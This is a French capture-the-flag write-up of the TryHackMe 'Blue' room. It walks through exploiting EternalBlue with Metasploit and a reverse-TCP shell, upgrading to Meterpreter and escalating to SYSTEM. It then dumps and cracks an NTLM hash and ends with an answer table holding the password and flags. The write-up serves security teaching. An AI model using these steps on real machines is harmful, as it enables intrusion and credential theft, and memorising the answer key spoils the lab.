# TryHackMe: Blue

**Objectif :** exploiter `MS17-010` sur une machine Windows, convertir le shell en session Meterpreter, elever les privileges, dumper le hash du compte non par defaut, casser son mot de passe puis recuperer les trois flags de la room.

---

## Introduction

La room **Blue** est l'un des grands classiques de TryHackMe. Elle est concue pour apprendre EternalBlue sans trop de bruit autour :

- detection de la faille SMB
- exploitation Metasploit
- conversion shell -> Meterpreter
- `getsystem`, `ps`, migration
- `hashdump`
- cassage de hash NTLM
- recuperation de flags symbolisant des emplacements clefs de Windows

---

## Task 1: Recon

### Question 1: Scan and learn what exploit this machine is vulnerable to

Je commence par un scan reseau en prenant en compte le fait que la machine ne repond pas au ping :

```bash
nmap -Pn -sC -sV <IP>
```

Les ports SMB sont exposes, ce qui fait tout de suite penser a EternalBlue.

### Reponse

`Done`

---

## Task 2: Gain Access

### Question 1: What is the full path of the code?

Dans Metasploit :

```text
search ms17-010
```

Le module attendu par la room est :

```text
exploit/windows/smb/ms17_010_eternalblue
```

### Reponse

**Exploit path:** `exploit/windows/smb/ms17_010_eternalblue`

### Question 2: What is the name of the required value? (All caps)

J'affiche les options du module :

```text
show options
```

Le parametre requis a renseigner est :

```text
RHOSTS
```

### Reponse

**Required value name:** `RHOSTS`

### Question 3: Set payload windows/x64/shell/reverse_tcp and run the exploit

La room demande explicitement de changer le payload :

```text
set payload windows/x64/shell/reverse_tcp
set RHOSTS <IP>
set LHOST <MON_IP_THM>
run
```

### Reponse

`Done`

### Question 4: Confirm that the exploit has run correctly

Si tout se passe bien, j'obtiens un shell DOS via Metasploit. La room veut simplement confirmer que l'exploitation a fonctionne.

### Reponse

`Done`

---

## Task 3: Escalate

### Question 1: What is the name of the post module we will use?

Pour convertir un shell standard en Meterpreter, la commande demandee est :

```text
post/multi/manage/shell_to_meterpreter
```

### Reponse

**Post module:** `post/multi/manage/shell_to_meterpreter`

### Question 2: What option are we required to change?

En affichant les options du module :

```text
show options
```

Le parametre essentiel a renseigner est :

```text
SESSION
```

### Reponse

**Required option:** `SESSION`

### Question 3: Set the required option

Je selectionne la session shell ouverte par EternalBlue :

```text
set SESSION 1
run
```

### Reponse

`Done`

### Question 4: Run the post module

Une nouvelle session Meterpreter s'ouvre.

### Reponse

`Done`

### Question 5: Select the Meterpreter session

```text
sessions -i <ID>
```

### Reponse

`Done`

### Question 6: Verify that we have escalated to NT AUTHORITY\SYSTEM

Je teste l'elevation :

```text
getsystem
shell
whoami
```

Le resultat attendu est :

```text
nt authority\system
```

### Reponse

`Done`

### Question 7: Find a process running as NT AUTHORITY\SYSTEM and note the PID

Je liste les processus :

```text
ps
```

La room demande seulement un exemple valide de PID SYSTEM. Il varie selon l'instance. L'important est de choisir un processus stable tournant bien sous `NT AUTHORITY\SYSTEM`.

### Reponse

`Done`

### Question 8: Migrate to this process

Je migre :

```text
migrate <PID>
```

### Reponse

`Done`

---

## Task 4: Cracking

### Question 1: What is the name of the non-default user?

Dans Meterpreter :

```text
hashdump
```

La sortie fait apparaitre les comptes locaux. Le seul compte non par defaut est :

```text
Jon
```

### Reponse

**Non-default user:** `Jon`

### Question 2: What is the cracked password?

Je copie le hash NTLM de Jon dans un fichier :

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Mot de passe cracke :

```text
alqfna22
```

### Reponse

**Cracked password:** `alqfna22`

---

## Task 5: Find flags!

### Flag 1: This flag can be found at the system root

Depuis le shell ou Meterpreter :

```text
cd C:\
type flag1.txt
```

Contenu :

```text
flag{access_the_machine}
```

### Reponse

**Flag1:** `flag{access_the_machine}`

### Flag 2: This flag can be found at the location where passwords are stored within Windows

Le hint pointe vers :

```text
C:\Windows\System32\config
```

Je lis :

```text
type C:\Windows\System32\config\flag2.txt
```

Contenu :

```text
flag{sam_database_elevated_access}
```

### Reponse

**Flag2:** `flag{sam_database_elevated_access}`

### Flag 3: This flag can be found in an excellent location to loot

Le hint suggere les documents d'un administrateur ou d'un utilisateur privilegie. Ici, le fichier se trouve dans :

```text
C:\Users\Jon\Documents\flag3.txt
```

Lecture :

```text
type C:\Users\Jon\Documents\flag3.txt
```

Contenu :

```text
flag{admin_documents_can_be_valuable}
```

### Reponse

**Flag3:** `flag{admin_documents_can_be_valuable}`

---

## Recapitulatif des reponses

| Question | Reponse |
|----------|---------|
| Full path of the exploit | `exploit/windows/smb/ms17_010_eternalblue` |
| Required value name | `RHOSTS` |
| Post module for shell conversion | `post/multi/manage/shell_to_meterpreter` |
| Required option in the post module | `SESSION` |
| Non-default user | `Jon` |
| Cracked password | `alqfna22` |
| Flag1 | `flag{access_the_machine}` |
| Flag2 | `flag{sam_database_elevated_access}` |
| Flag3 | `flag{admin_documents_can_be_valuable}` |

---

## Points cles a retenir

- `MS17-010` reste une reference pour comprendre l'impact d'un service SMB non patche.
- Une fois le shell obtenu, la vraie pedagogie de la room commence : Meterpreter, migration, `hashdump`.
- Les flags sont places pour faire memoriser des emplacements importants de Windows :
  - racine `C:\`
  - `System32\config`
  - `Users\<profil>\Documents`

---

**Auteur :** Saad Idrissi
